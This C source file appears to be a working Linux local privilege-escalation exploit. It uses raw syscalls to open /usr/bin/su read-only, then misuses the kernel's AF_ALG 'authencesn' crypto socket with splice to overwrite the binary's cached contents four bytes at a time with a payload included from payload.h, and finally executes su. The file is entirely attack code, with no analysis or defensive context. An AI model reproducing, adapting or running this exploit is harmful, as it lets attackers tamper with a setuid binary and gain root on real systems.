#define _GNU_SOURCE
#include <fcntl.h>
#include <linux/if_alg.h>
#include <stddef.h>
#include <sys/socket.h>
#include <sys/syscall.h>

#ifndef SOL_ALG
#define SOL_ALG 279
#endif

#include "payload.h"

#define PAYLOAD_LEN (sizeof(payload))

static long sc2(long n, long a, long b)
{
    long r;
    __asm__ volatile("syscall" : "=a"(r) : "0"(n), "D"(a), "S"(b) : "rcx", "r11", "memory");
    return r;
}

static long sc3(long n, long a, long b, long c)
{
    long r;
    __asm__ volatile("syscall" : "=a"(r) : "0"(n), "D"(a), "S"(b), "d"(c) : "rcx", "r11", "memory");
    return r;
}

static long sc6(long n, long a, long b, long c, long d, long e, long f)
{
    register long r10 __asm__("r10") = d;
    register long r8 __asm__("r8") = e;
    register long r9 __asm__("r9") = f;
    long r;

    __asm__ volatile("syscall"
                     : "=a"(r)
                     : "0"(n), "D"(a), "S"(b), "d"(c), "r"(r10), "r"(r8), "r"(r9)
                     : "rcx", "r11", "memory");
    return r;
}

static void die(void)
{
    sc2(SYS_exit, 1, 0);
    __builtin_unreachable();
}

static void do_memset(void *p, int c, long n)
{
    unsigned char *b = p;
    while (n--)
        *b++ = c;
}

static void do_memcpy(void *dst, const void *src, long n)
{
    unsigned char *d = dst;
    const unsigned char *s = src;
    while (n--)
        *d++ = *s++;
}

static void patch_chunk(int fd, int offset, const unsigned char *chunk, int chunk_len)
{
    struct sockaddr_alg sa = {
        .salg_family = AF_ALG,
        .salg_type = "aead",
        .salg_name = "authencesn(hmac(sha256),cbc(aes))",
    };

    int sock = sc3(SYS_socket, AF_ALG, SOCK_SEQPACKET, 0);
    if (sock < 0)
        die();

    if (sc3(SYS_bind, sock, (long)&sa, sizeof(sa)) < 0)
        die();

    unsigned char key[40] = {0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10};
    if (sc6(SYS_setsockopt, sock, SOL_ALG, ALG_SET_KEY, (long)key, sizeof(key), 0) < 0)
        die();
    if (sc6(SYS_setsockopt, sock, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, 0, 4, 0) < 0)
        die();

    int conn = sc3(SYS_accept, sock, 0, 0);
    if (conn < 0)
        die();

    int write_size = offset + 4;

    struct
    {
        struct cmsghdr hdr;
        unsigned char data[4];
    } cmsg_op, cmsg_assoclen;

    struct
    {
        struct cmsghdr hdr;
        unsigned char data[20];
    } cmsg_iv;

    cmsg_op.hdr.cmsg_level = SOL_ALG;
    cmsg_op.hdr.cmsg_type = ALG_SET_OP;
    cmsg_op.hdr.cmsg_len = CMSG_LEN(4);
    do_memset(cmsg_op.data, 0, 4);

    cmsg_iv.hdr.cmsg_level = SOL_ALG;
    cmsg_iv.hdr.cmsg_type = ALG_SET_IV;
    cmsg_iv.hdr.cmsg_len = CMSG_LEN(20);
    cmsg_iv.data[0] = 0x10;
    do_memset(cmsg_iv.data + 1, 0, 19);

    cmsg_assoclen.hdr.cmsg_level = SOL_ALG;
    cmsg_assoclen.hdr.cmsg_type = ALG_SET_AEAD_ASSOCLEN;
    cmsg_assoclen.hdr.cmsg_len = CMSG_LEN(4);
    cmsg_assoclen.data[0] = 0x08;
    do_memset(cmsg_assoclen.data + 1, 0, 3);

    unsigned char iov_buf[8];
    do_memset(iov_buf, 'A', 4);
    do_memcpy(iov_buf + 4, chunk, chunk_len);

    struct iovec iov = {.iov_base = iov_buf, .iov_len = 4 + chunk_len};

    char cmsg_buf[CMSG_SPACE(4) + CMSG_SPACE(20) + CMSG_SPACE(4)];
    do_memset(cmsg_buf, 0, sizeof(cmsg_buf));

    struct msghdr msg = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = cmsg_buf,
        .msg_controllen = sizeof(cmsg_buf),
    };

    char *c = cmsg_buf;
    do_memcpy(c, &cmsg_op, CMSG_SPACE(4));
    c += CMSG_SPACE(4);
    do_memcpy(c, &cmsg_iv, CMSG_SPACE(20));
    c += CMSG_SPACE(20);
    do_memcpy(c, &cmsg_assoclen, CMSG_SPACE(4));

    sc3(SYS_sendmsg, conn, (long)&msg, MSG_MORE);

    int pipefd[2];
    sc2(SYS_pipe2, (long)pipefd, 0);

    loff_t off = 0;
    sc6(SYS_splice, fd, (long)&off, pipefd[1], 0, write_size, SPLICE_F_NONBLOCK);
    sc6(SYS_splice, pipefd[0], 0, conn, 0, write_size, 0);

    unsigned char discard[PAYLOAD_LEN + 16];
    sc6(SYS_recvfrom, conn, (long)discard, 8 + offset, 0, 0, 0);

    sc2(SYS_close, pipefd[0], 0);
    sc2(SYS_close, pipefd[1], 0);
    sc2(SYS_close, conn, 0);
    sc2(SYS_close, sock, 0);
}

void _start(void)
{
    int fd = sc3(SYS_open, (long)"/usr/bin/su", 0, 0);
    if (fd < 0)
        die();

    for (int i = 0; i < (int)PAYLOAD_LEN; i += 4)
    {
        int chunk_len = (int)PAYLOAD_LEN - i;
        if (chunk_len > 4)
            chunk_len = 4;
        patch_chunk(fd, i, payload + i, chunk_len);
    }

    sc2(SYS_close, fd, 0);

    const char *su = "/usr/bin/su";
    const char *argv[] = {su, (char *)0};
    sc3(SYS_execve, (long)su, (long)argv, 0);
    die();
}
